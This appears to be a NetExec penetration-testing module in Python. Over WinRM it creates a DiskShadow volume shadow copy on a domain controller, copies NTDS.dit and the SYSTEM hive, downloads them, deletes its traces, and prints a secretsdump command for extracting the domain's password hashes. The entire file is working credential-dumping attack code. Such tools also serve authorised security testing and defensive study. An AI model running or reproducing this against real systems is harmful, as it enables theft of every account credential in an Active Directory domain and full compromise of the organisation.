"""Dump NTDS.dit via a VSS snapshot created with DiskShadow.

Requires SeBackupPrivilege, typically on a Domain Controller.
"""

import contextlib
import json
import os
import re
import shlex
import tempfile

from nxc.helpers.misc import CATEGORY, gen_random_string

# DiskShadow prefixes the alias line with whitespace.
# Alias matching is case-insensitive.
_ALIAS_LINE_RE = re.compile(
    r"^\s*->\s+%(?P<alias>[^%]+)%\s+=\s+\{(?P<guid>[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}",
    re.IGNORECASE | re.MULTILINE,
)

# Some Windows versions report the alias as an environment variable.
_ALIAS_ENVVAR_RE = re.compile(
    r"^\s*Alias\s+(?P<alias>\S+)\s+for\s+shadow\s+ID\s+\{(?P<guid>[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12})\}\s+set\s+as\s+environment\s+variable",
    re.IGNORECASE | re.MULTILINE,
)

# DiskShadow may return success without actually exposing the snapshot.
# Require the explicit exposure confirmation before continuing.
_EXPOSE_CONFIRM_RE = re.compile(
    r"(?im)^[ \t]*the[ \t]+shadow[ \t]+copy[ \t]+was[ \t]+successfully[ \t]+exposed[ \t]+as[ \t]+([A-Za-z]):\\\.[ \t\r]*$"
)

# Confirm that the exact snapshot GUID was deleted.
_CLEANUP_DELETING_RE = re.compile(
    r"deleting shadow copy \{([^}]+)\}\.\.\.", re.IGNORECASE
)
_CLEANUP_COUNT_RE = re.compile(r"1 shadow cop(?:y|ies) deleted", re.IGNORECASE)

_CRLF = "\r\n"


def parse_alias_guid(stdout: str, alias: str) -> str | None:
    """Return snapshot GUID bound to *alias* (uppercase), or ``None`` if absent.

    The same GUID appearing in both output formats counts as one match.
    Raises ``ValueError`` if more than one distinct GUID is bound to *alias*.
    """
    guids: set[str] = set()
    for pattern in (_ALIAS_LINE_RE, _ALIAS_ENVVAR_RE):
        for m in pattern.finditer(stdout):
            if m.group("alias").lower() == alias.lower():
                guids.add(m.group("guid").upper())
    if not guids:
        return None
    if len(guids) > 1:
        raise ValueError(
            f"Ambiguous: alias %{alias}% resolved to {len(guids)} distinct GUIDs"
        )
    return guids.pop()


def build_create_script(alias: str, drive_letter: str, metadata_path: str) -> str:
    """Build the DiskShadow creation script."""
    lines = [
        "set verbose on",
        "set context persistent nowriters",
        f"set metadata {metadata_path}",
        f"add volume C: alias {alias}",
        "create",
        f"expose %{alias}% {drive_letter}:",
        "exit",
    ]
    return _CRLF.join(lines) + _CRLF


def build_cleanup_script(drive_letter: str, shadow_guid: str) -> str:
    """Build the cleanup script for an exposed snapshot."""
    lines = [
        "set verbose on",
        f"unexpose {drive_letter}:",
        f"delete shadows id {{{shadow_guid}}}",
        "exit",
    ]
    return _CRLF.join(lines) + _CRLF


def build_delete_only_script(shadow_guid: str) -> str:
    """Build the cleanup script for an unexposed snapshot."""
    lines = [
        "set verbose on",
        f"delete shadows id {{{shadow_guid}}}",
        "exit",
    ]
    return _CRLF.join(lines) + _CRLF


class NXCModule:
    name = "ntds_shadow"
    description = "Dump NTDS.dit via a VSS snapshot (DiskShadow)"
    supported_protocols = ["winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """NO OPTIONS"""

    def _run_cmd(self, connection, cmd: str) -> tuple[str, str, int]:
        """Run a CMD command through PowerShell and return its output and exit code."""
        safe = cmd.replace("'", "''")
        ps = (
            "$p=[System.Diagnostics.Process]::new();"
            "$p.StartInfo.FileName='cmd.exe';"
            f"$p.StartInfo.Arguments='/c {safe}';"
            "$p.StartInfo.UseShellExecute=$false;"
            "$p.StartInfo.RedirectStandardOutput=$true;"
            "$p.StartInfo.RedirectStandardError=$true;"
            "[void]$p.Start();"
            "$ot=$p.StandardOutput.ReadToEndAsync();"
            "$et=$p.StandardError.ReadToEndAsync();"
            "$p.WaitForExit();"
            "[pscustomobject]@{O=$ot.Result;E=$et.Result;C=[int]$p.ExitCode}|ConvertTo-Json -Compress"
        )
        ps_stdout, streams, had_errors = connection.conn.execute_ps(ps)
        if had_errors:
            error_msgs = "; ".join(str(e) for e in (streams.error or []))
            raise RuntimeError(
                f"PowerShell adapter reported errors for {cmd!r}"
                + (f": {error_msgs}" if error_msgs else "")
            )
        if not ps_stdout:
            raise RuntimeError(f"No response from PowerShell adapter for: {cmd!r}")
        try:
            data = json.loads(ps_stdout)
            return str(data.get("O") or ""), str(data.get("E") or ""), int(data["C"])
        except (json.JSONDecodeError, KeyError, TypeError, ValueError) as exc:
            raise RuntimeError(
                f"Failed to parse adapter response for {cmd!r}: {exc}"
            ) from exc

    def on_login(self, context, connection):
        log = context.log

        if not self._check_privilege(log, connection):
            return

        run_id = gen_random_string(8).lower()
        alias = f"vss{run_id}"
        staging_dir = f"C:\\Windows\\Temp\\nxc_{run_id}"
        script_path = f"{staging_dir}\\create.dsh"
        metadata_path = f"{staging_dir}\\metadata.cab"
        ntds_dst = f"{staging_dir}\\ntds.dit"
        system_dst = f"{staging_dir}\\SYSTEM"

        _, stderr, rc = self._run_cmd(connection, f"mkdir {staging_dir}")
        if rc != 0:
            log.fail(f"Could not create staging directory: {stderr.strip()}")
            return

        shadow_guid = None
        drive_letter = None
        exposed = False
        ntds_ok = False
        system_ok = False
        local_ntds = local_system = ""
        try:
            drive_letter = self._pick_drive(log, connection)
            if not drive_letter:
                return

            if not self._upload(
                log,
                connection,
                build_create_script(alias, drive_letter, metadata_path),
                script_path,
            ):
                return

            log.display("Creating DiskShadow snapshot...")
            try:
                stdout, stderr, ds_create_rc = self._run_cmd(
                    connection, f"diskshadow /s {script_path}"
                )
            except Exception as exc:
                log.fail(
                    f"Could not run DiskShadow: {exc}. "
                    "A snapshot may remain on the target"
                )
                return

            # Parse the GUID even when DiskShadow returns an error. It may have created a snapshot before the error occurred.
            try:
                shadow_guid = parse_alias_guid(stdout, alias)
            except ValueError as exc:
                log.fail(
                    f"DiskShadow returned multiple snapshot GUIDs: {exc}. "
                    "A snapshot may remain on the target"
                )
                return

            expose_matches = _EXPOSE_CONFIRM_RE.findall(stdout)
            exposed = (
                len(expose_matches) == 1 and expose_matches[0].upper() == drive_letter
            )

            if ds_create_rc != 0:
                log.fail(f"DiskShadow returned exit code {ds_create_rc}")
                for line in stdout.splitlines():
                    if line.strip():
                        log.display(f"  [stdout] {line}")
                for line in stderr.splitlines():
                    if line.strip():
                        log.fail(f"  [stderr] {line}")
                if shadow_guid is None:
                    log.fail(
                        "No snapshot GUID was found, so a snapshot may remain on the target"
                    )
                return

            if not shadow_guid:
                log.fail(
                    "No snapshot GUID was found in the DiskShadow output, so a snapshot may remain on the target"
                )
                return

            if not exposed:
                log.fail(
                    f"DiskShadow did not confirm that the snapshot was exposed on {drive_letter}:"
                )
                return

            _, _, ntds_rc = self._run_cmd(
                connection, f'dir "{drive_letter}:\\Windows\\NTDS\\ntds.dit" /b'
            )
            if ntds_rc != 0:
                log.fail(
                    f"Could not access NTDS.dit at {drive_letter}:\\Windows\\NTDS\\ntds.dit"
                )
                return
            log.success("Snapshot created and NTDS accessible")

            log.display("Acquiring NTDS database and SYSTEM hive...")
            _, _, rob_rc = self._run_cmd(
                connection,
                f"robocopy {drive_letter}:\\Windows\\NTDS {staging_dir} ntds.dit /b /r:2 /w:1 /j",
            )
            # Robocopy considers exit codes 0 through 7 successful.
            if rob_rc >= 8:
                log.fail(
                    f"Could not copy NTDS.dit from the snapshot (exit code {rob_rc})"
                )
                return

            _, _, reg_rc = self._run_cmd(
                connection, f"reg save HKLM\\SYSTEM {system_dst} /y"
            )
            if reg_rc != 0:
                log.fail("Could not save the SYSTEM hive")
                return

            output_base = connection.output_file_template.format(output_folder="ntds")
            os.makedirs(os.path.dirname(output_base), exist_ok=True)
            local_ntds = f"{output_base}.ntds.dit"
            local_system = f"{output_base}.SYSTEM"
            ntds_ok = self._download(log, connection, ntds_dst, local_ntds, "NTDS.dit")
            system_ok = self._download(
                log, connection, system_dst, local_system, "SYSTEM"
            )
            if ntds_ok and system_ok:
                log.success("NTDS database and SYSTEM hive downloaded")
                log.display(
                    f"NTDS.dit: {local_ntds} ({os.path.getsize(local_ntds)} bytes)"
                )
                log.display(
                    f"SYSTEM.hive: {local_system} ({os.path.getsize(local_system)} bytes)"
                )

        except Exception as exc:
            log.fail(f"Could not acquire NTDS.dit and the SYSTEM hive: {exc}")
            return
        finally:
            try:
                self._cleanup(
                    log, connection, shadow_guid, drive_letter, exposed, staging_dir
                )
            except Exception as exc:
                log.fail(f"Cleanup failed: {exc}")

        if ntds_ok and system_ok:
            log.highlight(
                f"Run: impacket-secretsdump"
                f" -system {shlex.quote(local_system)}"
                f" -ntds {shlex.quote(local_ntds)} LOCAL"
            )
        else:
            log.fail(
                "One or more files could not be downloaded. "
                "The secretsdump command was not printed."
            )

    def _check_privilege(self, log, connection) -> bool:
        try:
            stdout, _, _ = self._run_cmd(connection, "whoami /priv /fo csv /nh")
        except Exception as exc:
            log.fail(f"Could not check SeBackupPrivilege: {exc}")
            return False
        for line in stdout.splitlines():
            parts = [p.strip('"') for p in line.split('","')]
            if len(parts) >= 3 and parts[0].upper() == "SEBACKUPPRIVILEGE":
                if parts[2].upper() == "ENABLED":
                    log.success("SeBackupPrivilege confirmed")
                    return True
                log.fail("SeBackupPrivilege is present but disabled")
                return False
        log.fail("SeBackupPrivilege was not found.. aborting..")
        return False

    def _pick_drive(self, log, connection) -> str | None:
        """Return the highest available drive letter from Z to D, or None."""
        output = (
            connection.execute(
                "[System.IO.DriveInfo]::GetDrives() | ForEach-Object { $_.Name }",
                True,
                shell_type="powershell",
            )
            or ""
        )
        occupied = {
            line.strip()[:2].upper() for line in output.splitlines() if line.strip()
        }
        for letter in "ZYXWVUTSRQPONMLKJIHGFED":
            if f"{letter}:" not in occupied:
                log.debug(f"Selected drive letter: {letter}:")
                return letter
        log.fail("No free drive letter available between D: and Z:")
        return None

    def _upload(self, log, connection, content: str, remote_path: str) -> bool:
        """Upload a generated script and remove the local temporary file."""
        local_path = None
        try:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".dsh", delete=False
            ) as tmp:
                tmp.write(content)
                local_path = tmp.name
            connection.conn.copy(local_path, remote_path)
            return True
        except Exception as exc:
            log.fail(f"Could not upload script to {remote_path}: {exc}")
            return False
        finally:
            if local_path:
                with contextlib.suppress(FileNotFoundError, OSError):
                    os.unlink(local_path)

    def _download(
        self, log, connection, remote_path: str, local_path: str, label: str
    ) -> bool:
        """Download a file and verify its size."""
        ps_out = connection.execute(
            f"(Get-Item '{remote_path}').Length", True, shell_type="powershell"
        )
        try:
            remote_size = int(ps_out.strip()) if ps_out else 0
        except ValueError:
            remote_size = 0
        if remote_size <= 0:
            log.fail(f"Could not determine the remote size of {label} (got {ps_out!r})")
            return False

        try:
            connection.conn.fetch(remote_path, local_path)
        except Exception as exc:
            log.fail(f"Could not download {label}: {exc}")
            with contextlib.suppress(FileNotFoundError, OSError):
                os.unlink(local_path)
            return False

        local_size = os.path.getsize(local_path) if os.path.exists(local_path) else -1
        if local_size != remote_size:
            log.fail(
                f"Downloaded {label}, but the file size does not match: remote={remote_size} B, local={local_size} B"
            )
            with contextlib.suppress(FileNotFoundError, OSError):
                os.unlink(local_path)
            return False

        return True

    def _cleanup(
        self,
        log,
        connection,
        shadow_guid: str | None,
        drive_letter: str | None,
        exposed: bool,
        staging_dir: str,
    ) -> None:
        """Remove the snapshot and staging files created by this run."""
        cleanup_ok = False
        if shadow_guid:
            script = (
                build_cleanup_script(drive_letter, shadow_guid)
                if exposed
                else build_delete_only_script(shadow_guid)
            )
            cleanup_path = f"{staging_dir}\\cleanup.dsh"
            if self._upload(log, connection, script, cleanup_path):
                try:
                    ds_stdout, _, ds_rc = self._run_cmd(
                        connection, f"diskshadow /s {cleanup_path}"
                    )
                    m = _CLEANUP_DELETING_RE.search(ds_stdout)
                    guid_confirmed = m and m.group(1).upper() == shadow_guid.upper()
                    count_confirmed = _CLEANUP_COUNT_RE.search(ds_stdout)

                    if ds_rc == 0 and guid_confirmed and count_confirmed:
                        cleanup_ok = True
                    else:
                        log.fail(
                            f"Could not remove snapshot {{{shadow_guid}}}. "
                            f"Snapshot {{{shadow_guid}}} may remain on the target"
                        )
                except Exception as exc:
                    log.fail(
                        f"Could not remove snapshot {{{shadow_guid}}}: {exc}. "
                        f"Snapshot {{{shadow_guid}}} may remain on the target"
                    )
            else:
                log.fail(
                    f"Could not upload the cleanup script. "
                    f"Snapshot {{{shadow_guid}}} may remain on the target"
                )

        # Remove the staging directory and any files created during the run.
        try:
            _, _, rm_rc = self._run_cmd(connection, f"rmdir /s /q {staging_dir}")
            if rm_rc != 0:
                log.fail(f"Could not remove staging directory: {staging_dir}")
                cleanup_ok = False
        except Exception as exc:
            log.fail(f"Could not remove staging directory {staging_dir}: {exc}")
            cleanup_ok = False
        if cleanup_ok:
            log.success("Remote artifacts and shadow copy removed")
